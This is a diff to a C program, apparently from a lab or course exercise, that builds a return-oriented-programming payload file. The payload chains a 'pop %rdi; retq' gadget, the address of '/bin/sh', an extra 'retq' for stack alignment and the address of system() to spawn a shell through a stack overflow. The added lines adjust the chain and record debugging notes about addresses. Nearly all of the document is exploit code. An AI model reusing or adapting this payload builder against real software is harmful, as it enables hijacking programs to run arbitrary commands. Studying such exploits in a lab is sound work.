@@ -17,6 +17,8 @@ unsigned char* littleEndian(char *str, int numChars);
 // 0x7ffff7baa5d5 <- 0x5f 0xc3 (gadget) pop %rdi  retq
 //
 
+//7FFFF7A47F7C <- execve call in do_system
+
 // prev fp value: 0x400550 prev fp address: 0x7fffffffdc60
 
 
@@ -39,6 +41,7 @@ int main(int argc, char *argv[]){
   unsigned char *shAddr;
   unsigned char *sysAddr;
   unsigned char *fpAddr;
+  unsigned char *gadget2;
 
   //strcpy(addr, "0x7fffffffdc30");
 
@@ -52,15 +55,19 @@ int main(int argc, char *argv[]){
   //mainRet = littleEndian("0x7fffffffdd48", 8);
   
   //address of /bin/sh in little endian
+
+  //NOTE - in the child process, for some reason, it seems to be taking 0x7ffff7b99670 instead of 73 as the last byte. I'm not sure why - but I think this is our bug
   shAddr = littleEndian("0x7ffff7b99673", 8);
 
   //address of system library call little endian
   sysAddr = littleEndian("0x7ffff7a48070", 8);
+  //sysAddr = littleEndian("0x7FFFF7A47F7C", 8);  
 
   //address of gadget
-  retAddr = littleEndian("0x7ffff7baa5d5", 8); 
-  
+  retAddr = littleEndian("0x7ffff7baa5d5", 8);
 
+  gadget2 = littleEndian("0x7ffff7baa5d6", 8);
+  
   unsigned char *byteAddr;
 
   if(argc != 2){
@@ -94,22 +101,21 @@ int main(int argc, char *argv[]){
   fwrite(retAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
   //write address of /bin/sh
   fwrite(shAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+
+  //return to gageth retq to align stack 16 bytes
+  fwrite(gadget2, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+
   //write address of 'system' library call
-  fwrite(sysAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  fwrite(sysAddr, sizeof(char),  ADDR_SIZE / BITS_IN_BYTE, file);
 
   //fwrite(littleEndian("0x1", 8), 1, 8, file);
   //fwrite(littleEndian("0x7fffffffde28", 8), 1, 8, file);
   
   //rewrite original FP
-  fwrite(pTemp, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
+  //fwrite(pTemp, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
   
   //rewrite original return address
-  fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
-
-
-  
-
-  
+  //fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);  
   
   free(pTemp);
   free(mainRet);
